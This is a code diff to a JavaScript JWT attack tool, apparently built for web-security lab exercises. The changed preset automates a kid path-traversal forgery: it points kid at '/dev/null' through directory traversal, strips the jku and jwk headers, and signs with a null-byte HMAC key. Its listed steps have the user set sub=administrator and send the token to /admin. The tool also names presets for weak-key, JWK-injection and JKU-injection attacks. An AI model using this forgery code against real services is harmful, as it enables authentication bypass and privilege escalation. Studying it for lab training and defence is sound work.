@@ -140,13 +140,14 @@ async function generateJwkAttackToken(forceJwkSign) {
     }
 
     if (selectedAttack === 'kid-path-traversal') {
-      // Fully automated lab-style flow: fixed traversal kid + null-byte key.
-      nextHeader.alg = 'HS256';
+      // Automated traversal kid + null-byte signing key, while preserving source alg/payload.
       nextHeader.kid = '../../../../../../../dev/null';
+      delete nextHeader.jku;
+      delete nextHeader.jwk;
       const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
       nextSig = await hmacSignBase64urlBytes(signingInput, new Uint8Array([0]), 'SHA-256');
       resultToken.value = `${signingInput}.${nextSig}`;
-      attackNotes.textContent = 'Auto-generated kid path traversal token (kid=/dev/null traversal, null-byte signing key).';
+      attackNotes.textContent = 'Auto-generated kid path traversal JWT (kid=/dev/null traversal, key=0x00; payload/alg preserved).';
       return;
     }
 
@@ -180,7 +181,7 @@ function configureInputForAttack(key) {
     return;
   }
   if (key === 'kid-path-traversal') {
-    showInput('Automation mode', '', 'No manual input needed: kid traversal and null-byte signing are scripted.');
+    attackInputSection.classList.add('hidden');
     extraInput.value = '';
     return;
   }
@@ -260,7 +261,7 @@ function getAttackSteps(key) {
   if (key === 'kid-path-traversal') {
     return [
       '1) Paste source JWT and click Decode token.',
-      '2) In payload editor set sub claim to administrator.',
+      '2) Optionally edit payload (for example set sub=administrator).',
       '3) Tool automatically sets kid to ../../../../../../../dev/null.',
       '4) Tool automatically signs with a null-byte key (0x00).',
       '5) Click Generate and send request to /admin.',
@@ -278,7 +279,7 @@ function getPresetHint(key) {
     'weak-signing-key': 'Requires user-provided secret.',
     'jwk-header-injection': 'Choose algorithm, generate key, then generate token.',
     'jku-header-injection': 'Requires jku URL.',
-    'kid-path-traversal': 'Fully automated: no manual key/header input required.',
+    'kid-path-traversal': 'Fully automated: click Generate to get ready JWT.',
   };
   return hints[key] || 'Choose preset and generate.';
 }
